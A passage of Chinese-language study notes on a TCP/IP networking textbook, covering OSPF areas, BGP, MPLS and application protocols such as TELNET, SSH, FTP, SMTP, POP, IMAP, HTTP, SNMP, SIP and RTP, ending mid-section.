alt="OSPF中根据链路状态生成路由控制表"></p><p>LAN中每10秒发送一个HELLO包。如果没有HELLO包到达，则进行连接是否断开的连接。具体为，允许空等3次，直到第4次（40秒后）仍无任何反馈就认为连接已经断开。之后在进行连接断开或恢复连接操作时，由于链路状态发生变化，路由器会发送一个链路状态更新包通知其他路由器网络状态的变化。</p><p>链路状态更新包所要传达的消息大致分为两类：一是网络LSA，另一个是路由器LSA。</p><p>网络LSA是以网络为中心生成的信息，表示这个网络都与哪些路由器相连接。而路由器LSA是以路由器为中心生成的信息，表示这个路由器与哪些网络相连接。</p><p>根据<strong>网络LSA</strong>和<strong>路由器LSA</strong>这两种信息，每个路由器就可以生成一个表示网络结构的链路状态数据库。根据这个数据库，可以采用Dijkstra算法生成相应的路由控制表。</p><p>相比距离向量，由上述过程所生成的路由控制表更加清晰不容易混淆，还可以有效降低无限循环问题的发生。</p><p>但是当网络规模逐渐变大的时候，最短路径优先算法的处理时间就会变得越长，对CPU和内存的消耗也就越大。</p><p><strong>4. 将区域分层化进行细分管理</strong></p><p>链路状态型路由协议的潜在问题在于，当网络规模越来越大的时候，表示链路状态的拓扑数据库就变得越来越大，路由控制信息的计算也就越来越困难。</p><p>所以引入了<strong>区域</strong>的概念</p><p>区域是指将连接在一起的网络和主机划分成小组，使一个自治系统内可以拥有多个区域。不过具有多个区域的自治系统必须要有一个主干区域，并且所有其他区域必须都与这个主干区域相连接。</p><p>连接区域与主干区域的路由器称作区域边界路由器；而区域内部的路由器叫做内部路由器；只与主干区域内连接的路由器叫做主干路由器；与外部相连接的路由器就是AS边界路由器。</p><p>每个区域内的路由器都持有本区域网络拓扑的数据库。然而，关于区域之外的路径消息，只能从区域边界路由器那里获知它们的距离。区域边界路由器也不会将区域内的链路状态信息全部鸳鸯发送给其他区域，只会发送自己到达这些路由器的距离信息，内部路由器所持有的网络拓扑数据库就会明显小很多。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230423162411001.png" alt="OSPF的路由器种类"></p><h3 id="7-6-BGP"><a href="#7-6-BGP" class="headerlink" title="7.6 BGP"></a>7.6 BGP</h3><p>BGP，边界网关协议使连接不同自治系统的一种协议，属于外部网关协议。具体划分，它主要用于ISP之间相连接的部分，只有BGP、RIP、OSPF共同进行路由控制，才能够进行整个互联网的路由控制。</p><p><strong>1. BGP与AS号</strong></p><p>在RIP和OSPF中利用IP的网络地址部分进行路由控制，然而BGP则需要放眼整个互联网进行路由控制。BGP的最终路由控制表由网络地址和下一站的路由器组来表示，不过它会根据所要经过的AS个数进行路由控制。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230423164222584.png" alt="BGP使用AS号管理网络信息"></p><p>ISP、区域网络等会将每个网络域编配成一个个自治系统进行管理。它们为每一个自治系统分配一个16比特的AS编号。BGP就是根据这个编号进行相应的路由控制。</p><p><strong>2. BGP是路径向量协议</strong></p><p>根据BGP交换路由控制信息的路由器叫做BGP扬声器。BGP扬声器为了在AS之间交换BGP信息，必须与所有AS建立对等的BGP连接。</p><p>如果AS内部有多个BGP扬声器，则也需要建立BGP连接。</p><p>BGP中数据包送达目标网络时，会生成一个中途经过所有AS的编号列表。这个表格也叫做AS路径信息访问列表。如果针对同一个目标地址出现多条路径时，BGP会从AS路径信息访问列表中选择一个较短的路由。</p><p>在做路由选择的度量的区别：</p><p><strong>RIP：路由器个数</strong></p><p><strong>OSPF：每个子网的成本</strong></p><p><strong>BGP：AS进行度量标准</strong></p><p>RIP和OSPF本着提高转发效率为目的，考虑到了网络的跳数和网络的带宽。BGP则基于AS之间的合约进行数据包的转发。BGP一般选择AS数最少的路径，不过仍然要遵循各个AS之间签约的细节进行更细粒度的路由选择。</p><p><strong>AS路径信息访问列表中不仅包含转发方向和距离，还涵盖了途径所有AS的编号，对网络构造仅用一元化表示</strong>，所以既不是距离向量型协议，也不是链路状态型协议。<strong>它属于路径向量型协议</strong></p><h3 id="7-7-MPLS"><a href="#7-7-MPLS" class="headerlink" title="7.7 MPLS"></a>7.7 MPLS</h3><p>在转发IP数据包的过程中除了使用路由技术外，还在使用<strong>标记交换技术</strong>。</p><p>路由技术基于IP地址中最长匹配原则进行转发，而标记交换则对每个IP包都设定一个叫做“标记”的值，然后根据这个“标记”再进行转发。</p><p>标记交换技术中最具代表性的是<strong>多协议标记交换技术</strong>，即MPLS</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424144727819.png" alt="IP网络中转发"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424144744169.png" alt="MPLS中转发"></p><p><strong>1. MPLS的网络基本动作</strong></p><p>实现MPLS功能的路由器叫做<strong>标记交换路由器</strong>（LSR）。</p><p>与外部网络连接的那部分LSR叫做<strong>标记边缘路由器</strong>（LER）。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424150628665.png" alt="使用Push、Swap和Pop功能进行转发"></p><p>在其IP首部的前面被追加了32比特的垫片头。在MPLS网络内，根据垫片头中的标记进一步进行转发。当数据离开MPLS时，垫片头就被去除。</p><p>附加标记转发的动作为<strong>Push</strong></p><p>替换标记转发的动作为<strong>Swap</strong></p><p>去掉标记转发的动作为<strong>Pop</strong></p><p>MPLS中目标地址和数据包都要通过由标记决定的同一个路径，这个路径叫做<strong>标记交换路径（LSP）</strong>。</p><p>LSP属于单方向的通路，如果需要双向的通信则需要两个LSP。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424151839742.png" alt="LSP设置"></p><p><strong>2. MPLS的优点</strong></p><p>MPLS的优势有两点</p><p>（1）转发速度快：路由器转发IP数据包时，首先要对目标地址和路由控制表中可变长的网络地址进行比较，然后从中选出最长匹配的路径才能进行转发。MPLS则是使用固定长度的标记信息，使得处理更加简单，可以通过高速的硬件实现转发。</p><p>（2）利用标记生成虚拟的路径，并在它的上面实现IP等数据包的通信。基于这些特点，被称之为“尽力而为”的IP网也可以提供基于MPLS的通信质量控制、带宽保证和VPN等功能。</p><h2 id="第8章-应用协议"><a href="#第8章-应用协议" class="headerlink" title="第8章 应用协议"></a>第8章 应用协议</h2><h3 id="8-1-应用层协议概要"><a href="#8-1-应用层协议概要" class="headerlink" title="8.1 应用层协议概要"></a>8.1 应用层协议概要</h3><p>利用网络的应用程序有很多，包括Web浏览器，电子邮件，远程登录，文件传输，网络管理等。能够让这些应用进行特定通信处理的正是应用协议。</p><p>网络应用由不同的用户和软件供应商开发而成。为了实现网络应用的功能，在应用之间进行通信时将其连接的网络协议是非常重要的。</p><h3 id="8-2-远程登录"><a href="#8-2-远程登录" class="headerlink" title="8.2 远程登录"></a>8.2 远程登录</h3><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424155036191.png" alt="远程登录"></p><p>远程登录是为了实现TSS环境，是将主机和终端的关系应用到计算机网络上的一个结果。远程登录主要使用TELNET和SSH两种协议。</p><p><strong>1. TELNET</strong></p><p>TELNET利用TCP的一条连接，通过这一条连接向主机发送文字命令并在主机上执行。本地用户好像直接与远端主机内部的shell相连着似的，直接在本地进行操作。</p><p>TELNET可以分为两类基本服务。一是仿真终端功能，二是协商选项机制。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424155950101.png" alt="TELNET"></p><p>TELNET经常用于登录路由器或高性能交换机等网络设备进行相应的设置。</p><p>TELNET中除了处理用户所输入的文字外，还提供选项的交互和协商功能。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424190431615.png" alt="行模式与透明模式"></p><p>TELNET客户端是指利用TELNET协议实现远程登录的客户端程序</p><p>TELNET客户端通常与目标主机的23号端口建立连接，并与监听这个端口的服务端程序telented进行交互。</p><p>一般的telnet命令中可以按照如下格式进行指定端口号：</p><p>telnet  主机名 TCP端口号</p><p>TCP端口号为21时可以连接到FTP应用，为25时可以连接到SMTP</p><p>为80时可以连接到HTTP，为110时可连接到POP3</p><p><strong>2. SSH</strong></p><p>SSH是加密的远程登录系统。</p><p>TELNET中登录时无需输入密码就可以发送，容易造成通信窃听和非法入侵的危险。使用SSH后可以加密通信内容，即使信息被窃听也无法破解所发送的密码，具体命令以及命令返回的结果是什么。</p><p>功能：</p><p>（1）可以使用更强的认证机制</p><p>（2）可以转发文件</p><p>（3）可以使用端口转发功能</p><p>端口转发是指将特定端口号所收到的消息转发到特定的IP地址和端口号码的一种机制。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424191236842.png" alt="SSH的端口转发"></p><h3 id="8-3-文件传输"><a href="#8-3-文件传输" class="headerlink" title="8.3 文件传输"></a>8.3 文件传输</h3><p>FTP是在两个相连的计算机之间进行文件传输时使用的协议。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424191400493.png" alt="文件传输FTP"></p><p>FTP中也需要登录到对方的计算机后才能进行相应的操作</p><p><strong>FTP的工作机制概要</strong></p><p>使用两条TCP连接：一条用来控制，另一条用于数据的传输</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424191906902.png" alt="FTP机制"></p><p>用于控制的TCP连接主要在FTP的控制部分使用。</p><p>例如登录用户名和密码的验证、发送文件的名称、发送方式的设置。</p><p>利用这个连接，可以通过ASCII码字符串发送请求和接收应答。在这个连接上无法发送数据，数据需要一个专门的TCP进行连接。</p><p>FTP控制用的连接使用的是TCP21号端口。</p><p><strong>在TCP21号端口上进行文件GET（RETR）、PUT(STOR)、以及文件一览（LIST）等操作时，每次都会建立一个用于数据传输的TCP连接。数据的传输和文件一览表的传输正是在这个新建的连接上进行。当数据传送完毕之后，传输数据的这条连接也会被断开，然后会在控制用的连接上继续进行命令或应答的处理</strong>。</p><p>用于数据传输的TCP连接是按照与控制用的连接相反的方向建立的。因此，在通过NAT连接外部FTP服务器的时候，无法直接建立传输数据时使用的TCP连接。此时，必须使用PASV命令修改建立连接的方向才行。</p><p><strong>通过ASCII码字符串进行的交互处理</strong></p><p>FTP中请求命令中使用着“RETR”等ASCII码字符串。而针对这些命令的应答则使用如”200”等3位数字的ASCII码字符串。</p><p>FTP主要的命令</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424195100027.png" alt="FTP主要命令"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424195121377.png" alt="传输参数的命令"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424195222401.png" alt="FTP服务命令"></p><p>FTP的主要应答消息</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424195253403.png" alt="提供信息"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424195305402.png" alt="连接管理相关应答"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424195328619.png" alt="连接管理相关应答（续）"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424195355180.png" alt="其他应答"></p><h3 id="8-4-电子邮件"><a href="#8-4-电子邮件" class="headerlink" title="8.4 电子邮件"></a>8.4 电子邮件</h3><p><strong>1. 电子邮件的工作机制</strong></p><p>提供电子邮件服务的协议叫做SMTP</p><p>SMTP为了实现高效发送邮件内容，在其传输层使用了TCP协议</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424195617227.png" alt="早期的电子邮件发送过程"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424195658276.png" alt="现代电子邮件发送过程"></p><p>为此，在技术上改变了以往直接在发送端与接收端主机之间建立TCP连接的机制，而引进了一种一直会连接电源的邮件服务器。发送和接收端通过邮件服务器进行收发邮件，接收端从邮件服务器接收邮件时使用POP3协议。</p><p>电子邮件的机制由3部分组成：邮件地址、数据格式以及发送协议</p><p><strong>2. 邮件地址</strong></p><p>电子邮件的发送地址由DNS进行管理。</p><p>DNS中注册有邮件地址及其作为发送地址时对应的邮件服务器的域名。</p><p>这些映射信息被称作MX记录，可以管理不同邮件地址与特定邮件服务器之间的映射关系。</p><p><strong>3. MIME</strong></p><p>MIME用于扩展电子邮件中的文本、图片、音频、视频等数据类型。</p><p>它定义了一套规则，允许电子邮件和其他应用程序在传输数据时能够识别和处理不同类型的数据。</p><p>MIME基本上由首部和正文两部分组成。首部不能是空行，因为一旦出现空行，其后的部分将被视为正文。</p><p>MIME具有代表性的Content-Type：</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424200452301.png" alt="Content-Type"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424200512290.png" alt="MIME举例"></p><p><strong>4. SMTP</strong></p><p>SMTP是发送电子邮件的协议，使用的是TCP的25号端口。</p><p>SMTP建立一个TCP连接以后，在这个连接上进行控制和应答以及数据的发送。客户端以文本的形式发出请求，服务端返回一个3位数字的应答。</p><p><strong>SMTP的主要命令</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424200908976.png" alt="SMTP的主要命令"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424203955674.png" alt="SMTP"></p><p>随着电子邮件使用的普及，那些漫天的广告邮件和包含钓鱼连接的垃圾邮件成为了日益严重的问题。</p><p>所以需要验证发送者的功能，<strong>“POP before SMTP”或”SMTP认证“</strong></p><p><strong>SMTP应答</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424204448940.png" alt="针对请求进行肯定确认应答"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424204516896.png" alt="数据输入"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424204538919.png" alt="发送错误消息"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424204558824.png" alt="无法继续处理的错误应答"></p><p><strong>5. POP</strong></p><p>个人电脑不可能长时间处于开机状态。只有用户在使用时才会开机。在这种情况下，人们希望一开机就能接收到邮件。然而SMTP没有这种处理机制。SMTP的一个不利之处就在于它支持的是发送端主机的行为，而不是根据接收端的请求发送邮件。</p><p>为了解决这个问题，就引入了<strong>POP协议</strong>。</p><p>该协议使一种用于接收电子邮件的协议。发送端的邮件根据SMTP协议将被转发给一直处于插电状态的POP服务器。客户端再根据POP协议从POP服务器接收对方发来的邮件。在这个过程中，为了防止他人盗窃邮件内容，还要进行用户验证。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424205123336.png" alt="POP的工作机制"></p><p>POP与SMTP一样，也是在其客户端与服务器之间通过建立一个TCP连接完成相应操作。</p><p><strong>POP主要命令</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424205244890.png" alt="认证时的有效命令"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424205311744.png" alt="应答"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424205322706.png" alt="事务状态命令"></p><p><strong>6. IMAP</strong></p><p>IMAP与POP类似，也是接收电子邮件的协议。</p><p><strong>优势：</strong></p><p>（1）使用IMAP时，可以不必从服务器上下载所有的邮件也可以阅读</p><p>（2）IMAP是在服务器端处理MIME信息，所以它可以实现当某一封邮件含有10个附件时“只下载其中的第7个附件”的功能。这在带宽较窄的线路上起着非常重要的作用。而且IMAP在服务器上对“已读/未读”信息和邮件分类进行管理，因此，即使在不同的计算机上打开邮箱，也能保持同步，为使用多种异构终端的人们提供了非常便利的环境。</p><h3 id="8-5-WWW"><a href="#8-5-WWW" class="headerlink" title="8.5 WWW"></a>8.5 WWW</h3><p><strong>1. 互联网的蓬勃发展</strong></p><p>万维网是将互联网中的信息以超文本形式展现的系统，也叫做Web。</p><p>借助浏览器，不需要考虑该信息保存在哪个服务器，只需要轻轻点击鼠标就可以访问页面上的链接并打开相关信息。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424210206129.png" alt="WWW"></p><p><strong>2. WWW基本概念</strong></p><p>WWW定义了3个重要的概念，分别是访问信息的手段与位置（URI）、信息的表现形式（HTML）、信息转发（HTTP）</p><p><strong>3. URI</strong></p><p>URI用于标识资源，是一种可以用于WWW之外的高效的识别码，它被用于主页地址、电子邮件、电话号码等各种组合中。</p><p>URI所表示的组合叫方案（Scheme）</p><p>URI的http方案的具体格式如下：</p><p><a href="http://主机名/路径">http://主机名/路径</a></p><p><a href="http://主机名：端口号/路径">http://主机名：端口号/路径</a></p><p><a href="http://主机名：端口号/路径？访问内容#部分信息">http://主机名：端口号/路径？访问内容#部分信息</a></p><p>其中主机名表示域名或IP地址，端口号表示传输端口号。</p><p>省略端口号时，则表示采用http的默认端口号80</p><p><strong>URI的主要方案</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424210905915.png" alt="主要的URI方案"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424210927755.png" alt="主要的URI方案（续）"></p><p><strong>4. HTML</strong></p><p>HTML是记述Web页的一种语言。它可以指定浏览器中显示的文字、文字的大小和颜色。此外，不仅可以对图像或动画进行相关设置，还可以设置音频内容。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424211145136.png" alt="HTML举例"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424211200527.png" alt="浏览器读取并显示内容"></p><p><strong>5. HTTP</strong></p><p>当用户在浏览器的地址栏里输入所要访问Web页的URI以后，HTTP的处理即会开始。</p><p>HTTP中默认使用80端口，它的工作机制，首先是客户端向服务器的80端口建立一个TCP连接，然后在这个TCP连接上进行请求和应答以及数据报文的发送。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424211415045.png" alt="HTTP的工作机制"></p><p>HTTP中常用的有两个版本，一个HTTP1.0，另一个是HTTP1.1</p><p>在HTTP1.0中每一个命令和应答都会触发一次TCP连接的建立和断开，而从HTTP1.1开始，允许在一个TCP连接上发送多个命令和应答。由此，大量地减少了TCP连接的建立和断开操作，从而也提高了效率。</p><p><strong>HTTP的主要命令</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424212229111.png" alt="HTTP的主要命令"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424212245032.png" alt="信息传递"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424212303044.png" alt="肯定应答"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424212317081.png" alt="重定向请求"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424212333631.png" alt="客户端请求内容出现错误"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424212357294.png" alt="服务器错误"></p><p><strong>6. JavaScript、CGI、Cookie</strong></p><p><strong>JavaScript</strong></p><p>Web的基本要素是URI、HTML、HTTP</p><p>但是仅有这些还无法更改与条件相符的动态内内容，所以引入Javascript</p><p>Javascript是一种嵌入在HTML中的编程语言。作为客户端程序可以运行于多种类型的浏览器中，这些浏览器将嵌入JavaScript的HTML下载后，其对应的JavaScript程序就可以在客户端得到执行。这种JavaScript程序用于验证客户端输入字符串是否过长、是否填写或选择了页面中的必须选项等功能。</p><p>JavaScript还可以用于操作HTML或XML的逻辑结构以及动态显示Web页的内容和页面风格上。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230424212855634.png" alt="JavaScript、CGI的处理"></p><p><strong>CGI</strong></p><p>CGI是Web服务器调用外部程序时所使用的一种服务端应用的规范。</p><p>一般的Web通信中，只是按照客户端请求将保存在Web服务器硬盘中的数据转发而已。这种情况下客户端每次收获的信息也是同样的内容。而引入CGI以后客户端请求会触发Web服务器运行另一个程序，客户端所输入的数据也会传给这个外部程序。该程序运行结束后会将生成的HTML和其他数据再返回给客户端。</p><p>利用CGI可以针对用户的操作返回给客户端的有各种各样的变化的信息。论坛和网上购物系统中就经常使用CGI调用外部程序或访问数据库。</p><p><strong>Cookie</strong></p><p>Web应用中为了获取用户信息使用一个叫做Cookie的机制。Web服务器用Cookie在客户端保存信息。</p><p>Cookie常被用于保存登录信息或网络购物中放入购物车的商品信息。</p><p>从Web服务器检查Cookie可以确认是否为同一对端的通信，从而存放于购物车里的商品信息就不必要在保存到服务器了。</p><h3 id="8-6-网络管理"><a href="#8-6-网络管理" class="headerlink" title="8.6 网络管理"></a>8.6 网络管理</h3><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230426150045435.png" alt="网络管理"></p><p>以前网络管理是凭借管理员的记忆和直觉进行。然而随着网络规模变得越来越大，个人的记忆、经验或直觉已经无法与之匹配，需要一个严密的管理工具或方法。所以在TCP/IP的网络管理中可以使用<strong>SNMP</strong>收集必要的信息。它是一款基于UDP/IP的协议。</p><p><strong>SNMP中管理端叫做管理器，被管理端叫做代理（路由器、交换机等）</strong></p><p>但是存在安全隐患，所以在SNMPv3集合了所有SNMP的功能于同一个版本，定义了个人的功能模块，并可以结合各种不同版本进行通信。</p><p><strong>1. SNMP工作机制</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230426150548343.png" alt="SNMP工作机制"></p><p><strong>查询请求和应答</strong>可以定期检查设备的运行动作</p><p><strong>设置请求</strong>可以修改设备的参数</p><p>SNMP的处理可以分为从设备读取数据和向设备写入数据两种。它们采用Fetch和Store模式。</p><p>出于某种原因网络设备的状况发生变化，将这个变化通知给SNMP管理器时就可以使用Trap。有了Trap，即使没有管理器到代理的请求，也能在设备发生变化时收到从代理发来的通知。</p><p><strong>2. MIB</strong></p><p>SNMP中交互的信息是MIB。MIB是在树形结构的数据库中为每个项目附加编号的一种信息结构。SNMP访问MIB信息时使用数字序列。</p><p>SNMP中可以将MIB值写入代理，也可以从代理中读取MIB值，通过这些操作可以手机冲突的次数和流量统计等信息，可以修改接口的IP地址，还可以进行路由器的启停、设备的启动和关闭等处理。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230426151623903.png" alt="MIB树举例"></p><p><strong>3. RMON</strong></p><p>RMON是Remote Monitoring MIB的缩写。MIB由监控网络中某个设备接口的众多参数构成。相比之下，RMON则由监控网络上线路的众多参数构成。</p><p><strong>RMON可以监控某个特定的主机在哪里通过什么样的协议正在与谁进行通信的统计信息，可以更加详细地了解网络上成为负荷的主机并进行后续分析</strong></p><p><strong>RMON中从当前使用状况到通信方向性位置，可以以终端为单位也可以以协议为单位进行监控</strong></p><h3 id="8-7-其他应用层协议"><a href="#8-7-其他应用层协议" class="headerlink" title="8.7 其他应用层协议"></a>8.7 其他应用层协议</h3><p><strong>1. 多媒体通信实现技术</strong></p><p><strong>H.323</strong></p><p>H.323是由ITU开发用于在IP网上传输音频，视频的一种协议。</p><p>H.323定义了4个主要组件：终端（用户终端）、网关（吸收用户数据压缩顺序的不一致性）、网闸（电话本管理、呼叫管理）以及多点控制单元（允许多个终端同时使用）</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230426153313525.png" alt="H.323的基本构成"></p><p><strong>SIP</strong></p><p>终端之间进行多媒体通信时，需要具备事先先解析对方地址、呼出对方号码并对所要传输的媒体信息进行处理等功能。此外，还需要具备中断会话和数据转发的功能。这些功能都被统一于SIP协议中。</p><p>通过终端之间收发消息，可以令SIP进行呼叫控制并做一些多媒体通信中必要的准备。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230426154101270.png" alt="SIP基本组成"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230426154131556.png" alt="通过SIP服务器的呼叫控制的顺序"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230426154155419.png" alt="主要SIP命令"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230426154214759.png" alt="主要SIP响应消息"></p><p><strong>RTP</strong></p><p>RTP用来对UDP实现实时的多媒体通信附加一个表示报文顺序的序列号字段，对报文发送时间进行管理。</p><p>RTP为每个报文附加时间戳和序列号。接收报文的应用，根据时间戳决定数据重构的时机。序列号则根据每发出一次报文加一的原则进行累加。RTP使用这个序列号对同一时间戳的数据进行排序，掌握是否有丢包情况发生。</p><p><strong>RTCP</strong>是辅助RTP的一种协议，通过丢包率等线路质量的管理，对RTP的数据传送率进行控制。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230426154912852.png" alt="RTP通信"></p><p><strong>数字压缩技术</strong></p><p>通过有效的压缩可以大量减少音频和视频数据的大小。在有限的网络资源中进行多媒体数据的传输，压缩技术成为一个必要的手段。</p><p>MPEG是决定数字压缩规范的ISO/IEC工作组。在这里所指定的规范叫做MPEG。在MPEG的众多规范中，MPEG1主要用于VideoCD，而MPEG2主要用于DVD和数字电视播放领域。此外还有MPEG4,MPEG7……</p><p><strong>2. P2P</strong></p><p>互联网上电子邮件的通信，普遍属于一台服务器对应多个客户端的C/S模式，即1对N的通信形态。</p><p>网络上的终端或主机不经服务器直接1对1相互通信的情况叫做P2P。</p><p><strong>3. 